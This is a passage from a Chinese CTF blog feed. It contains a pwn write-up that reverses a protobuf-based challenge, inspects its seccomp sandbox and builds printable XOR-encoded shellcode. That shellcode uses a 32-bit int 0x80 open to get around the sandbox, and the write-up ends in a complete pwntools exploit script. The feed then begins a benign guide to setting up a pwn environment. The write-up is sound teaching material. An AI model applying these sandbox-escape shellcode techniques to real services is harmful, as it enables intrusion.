string">"Bot__Msgbot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C80                 dq offset aBot          <span class="token punctuation">;</span> <span class="token string">"bot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C88                 dq <span class="token number">38</span>h#结构体大小<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C90                 dq <span class="token number">3</span>#字段数<span class="token operator">=</span>实际字段数，是proto3<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C98                 dq offset off_3B80      <span class="token punctuation">;</span> <span class="token string">"msgid"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CA0                 dq offset unk_20A0<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CA8                 dq <span class="token number">1</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CB0                 dq offset unk_20B0<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CB8                 dq offset sub_1819<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>D17 _data_rel_ro    ends<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>D17<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编写和编译proto文件"><a href="#编写和编译proto文件" class="headerlink" title="编写和编译proto文件"></a>编写和编译proto文件</h3><p>根据以上分析编写<code>bot.proto</code> 内容如下</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto3"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">Msgbot</span><span class="token punctuation">&#123;</span>    <span class="token builtin">int64</span> msgid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token builtin">int64</span> msgsize <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token builtin">bytes</span> msgcontent <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. bot.proto</code>编译得到<code>bot_pb2.py</code>和<code>bot_pb2_grpc.py</code>，在<code>exp</code>中导入<code>bot_pb2</code>即可使用<code>bot_pb2</code>中的<code>Msgbot</code>来发送题目特定格式的消息，需要注意的是发送前需要先用<code>SerializeToString</code>序列化</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpcmsg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token builtin">id</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> sizemsg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> contentserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>在发送的消息能被正确接收之后当<code>msg[0][3] == (void *)0xC0DEFEEDLL</code>且<code>msg[0][4] == (void *)0xF00DFACELL</code>、<code>msg[0][5] &lt;= 0xC7</code>时将<code>msg[0] + 6</code>复制到<code>dest</code>中作为<code>shellcode</code>执行，<code>msg[0][3]</code>就是<code>msgid</code>，<code>msg[0][4]</code>是<code>msgsize</code>，<code>msg[0] + 6</code>是<code>msgcontent</code>，<code>msg[0][5]</code>获取了<code>msgcontent</code>的长度</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0xC0DEFEEDLL</span> <span class="token operator">&amp;&amp;</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0xF00DFACELL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v1<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v1<span class="token punctuation">,</span> v0<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_C0 <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">&amp;&amp;</span> v7 <span class="token operator">&lt;=</span> <span class="token number">0xC7</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dest<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以可以构造结构体如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpcmsg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token number">0xC0DEFEED</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> <span class="token number">0xF00DFACE</span>msg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> shellcodeserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>check</code>函数对<code>shellcode</code>进行了检查，限制<code>shellcode</code>在可见字符范围内</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> i <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token char">'\x1F'</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\x7F'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Oops!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a>写shellcode</h2><p><strong>调试<code>shellcode</code>的时候用<code>si</code>不要用<code>ni</code>！！</strong></p><h3 id="检查沙箱"><a href="#检查沙箱" class="headerlink" title="检查沙箱"></a>检查沙箱</h3><p>通过<code>check</code>之后开启沙箱，所以要执行到发送正确的消息之后才能用<code>seccomp-tools</code>查看沙箱情况，这里可以将<code>process</code>的参数设置为<code>seccomp-tools</code>即<code>r = process([&quot;seccomp-tools&quot;, &quot;dump&quot;, &quot;./pwn&quot;])</code>，发送完<code>msg</code>就会显示沙箱的情况</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"> line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token number">0000</span><span class="token operator">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  A <span class="token operator">=</span> sys_number <span class="token number">0001</span><span class="token operator">:</span> <span class="token number">0x35</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x40000000</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0003</span> <span class="token number">0002</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x06</span> <span class="token number">0xffffffff</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0003</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x05</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> read<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0004</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x04</span> <span class="token number">0x00</span> <span class="token number">0x00000001</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> write<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0005</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x03</span> <span class="token number">0x00</span> <span class="token number">0x00000005</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> fstat<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0006</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x02</span> <span class="token number">0x00</span> <span class="token number">0x00000025</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> alarm<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0007</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x01</span> <span class="token number">0x00</span> <span class="token number">0x000000e7</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> exit_group<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0008</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword">return</span> KILL <span class="token number">0009</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x7fff0000</span>  <span class="token keyword">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里限制了只能使用<code>read write fstat alarm exit_group</code>，程序是<code>64</code>位的，而<code>fstat</code>在<code>32</code>位中对应的函数就是<code>open</code>，所以可以使用<code>32</code>位的<code>open</code>和<code>64</code>位的<code>read write</code></p><h3 id="构造syscall"><a href="#构造syscall" class="headerlink" title="构造syscall"></a>构造syscall</h3><p>限制了可见字符且限制长度的情况下第一步就需要先构造一个<code>read</code>无限制的再读一次，而<code>syscall</code>的汇编字节是<code>0x0f05</code>不在可见字符范围内，所以需要通过异或构造，需要注意端序问题，小端序要反过来写进去，即<code>0x050f</code>，写在<code>shellcode</code>末尾用来异或的数值也要反过来写，我选择的是<code>0x66666963 ^ 0x66666c6c = 0x50f</code>，构造<code>shellcode</code>如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push 0x66666963pop rsixor qword ptr [rax + 0x20], rsipush rbxpop rdixor al, 0x22push raxpop rsipush 0x66666963pop rdxpush rbxpop raxpush raxpush raxpush raxpush raxpush raxpush rax\x6c\x6c\x66\x66<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="架构切换调用open"><a href="#架构切换调用open" class="headerlink" title="架构切换调用open"></a>架构切换调用open</h3><p>使用汇编指令<code>retfq</code>切换架构，原理是改<code>cs</code>寄存器，当<code>cs</code>寄存器的值为<code>0x33</code>时识别为<code>64</code>位，当寄存器值位<code>0x23</code>时识别位<code>32</code>位，而<code>retfq</code>指令相当于<code>pop ip; pop cs</code>，所以需要先<code>push cs</code>再<code>push</code>需要执行的指令地址最后<code>retfq</code>切换架构</p><p>不过其实我没切换直接写<code>32</code>位的<code>shellcode</code>用<code>int 80</code>实现系统调用也能执行<code>open</code>…<code>shellcode</code>如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov  eax, 5push ecxpop  ebxmov  dword ptr [ecx], 0x6c662f2eadd  ecx, 4mov  dword ptr [ecx], 0x6761xor ecx, ecxxor edx, edxint  0x80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpccontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">21231</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''push 0x66666963pop rsixor qword ptr [rax + 0x20], rsipush rbxpop rdixor al, 0x22push raxpop rsipush 0x66666963pop rdxpush rbxpop raxpush raxpush raxpush raxpush raxpush raxpush rax\x6c\x6c\x66\x66'''</span>msgcontent <span class="token operator">=</span> <span class="token string">b'\x68\x63\x69\x66\x66\x5e\x48\x31\x70\x20\x53\x5f\x34\x22\x50\x5e\x68\x63\x69\x66\x66\x5a\x53\x58'</span> <span class="token operator">+</span> <span class="token string">b'\x50'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x6c\x6c\x66\x66'</span>msg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token number">0xC0DEFEED</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> <span class="token number">0xF00DFACE</span>msg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> msgcontentserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov  eax, 5push ecxpop  ebxmov  dword ptr [ecx], 0x6c662f2eadd  ecx, 4mov  dword ptr [ecx], 0x6761xor ecx, ecxxor edx, edxint  0x80'''</span>shellcode <span class="token operator">=</span> <span class="token string">b"\xb8\x05\x00\x00\x00\x51\x5b\xc7\x01\x2e\x2f\x66\x6c\x83\xc1\x04\xc7\x01\x61\x67\x00\x00\x31\xc9\x31\xd2\xcd\x80"</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本题来源于源鲁杯第一轮&lt;code&gt;pwn&lt;/code&gt;的困难题，向程序发送了&lt;code&gt;msg&lt;/code&gt;之后会判定是否符合&lt;code&gt;proto&lt;/code&gt;结构，符合则开启沙箱仅允许执行&lt;code&gt;read、write、fstat、alarm、exit_group&lt;/</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
    <category term="protobuf" scheme="https://starrysky1004.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>pwn环境配置</title>
    <link href="https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/pwn-huan-jing-pei-zhi/"/>
    <id>https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/pwn-huan-jing-pei-zhi/</id>
    <published>2024-10-05T09:04:55.000Z</published>
    <updated>2024-12-10T07:15:56.284Z</updated>
    
    <content type="html"><![CDATA[<p>视频版：<a href="https://www.bilibili.com/video/BV1YT1oYeEVd">https://www.bilibili.com/video/BV1YT1oYeEVd</a></p><h2 id="更新、安装vim"><a href="#更新、安装vim" class="headerlink" title="更新、安装vim"></a>更新、安装vim</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">vim</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="安装必要环境"><a href="#安装必要环境" class="headerlink" title="安装必要环境"></a>安装必要环境</h2><p>将一下内容写入一个<code>sh</code>脚本文件中，为<code>chmod 777 xxx.sh</code>文件赋权限后直接<code>./xxx.sh</code>运行脚本，中途会出现<code>Do you want to continue? [Y/n]</code>输入<code>y</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> ~<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> tzdata<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">vim</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libxml2-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libxslt-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libmysqlclient-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libsqlite3-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> zlib1g-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python2-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-pip<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libffi-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libssl-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">wget</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">curl</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> clang<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">zip</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libncursesw5-dev libgdbm-dev libc6-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> tk-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssl<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> virtualenv<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> proxychains4<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby-dev<span class="token comment">#setuptools 36.6.1 -> python2</span><span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/56/a0/4dfcc515b1b993286a64b9ab62562f09e6ed2d09288909aee1efdb9dde16/setuptools-36.6.1.zip<span class="token function">unzip</span> setuptools-36.6.1.zip<span class="token builtin class-name">cd</span> setuptools-36.6.1<span class="token function">sudo</span> python2 setup.py <span class="token function">install</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> setuptools-36.6.1 setuptools-36.6.1.zip<span class="token comment">#setuptools 65.4.1 -> python3</span><span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/03/c9/7b050ea4cc4144d0328f15e0b43c839e759c6c639370a3b932ecf4c6358f/setuptools-65.4.1.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> setuptools-65.4.1.tar.gz<span class="token builtin class-name">cd</span> setuptools-65.4.1<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> setuptools-65.4.1 setuptools-65.4.1.tar.gz<span class="token comment">#pip</span><span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/53/7f/55721ad0501a9076dbc354cc8c63ffc2d6f1ef360f49ad0fbcce19d68538/pip-20.3.4.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pip-20.3.4.tar.gz<span class="token builtin class-name">cd</span> pip-20.3.4<span class="token function">sudo</span> python2 setup.py <span class="token function">install</span><span class="token function">sudo</span> python3 setup.py <span class="token function">install</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token 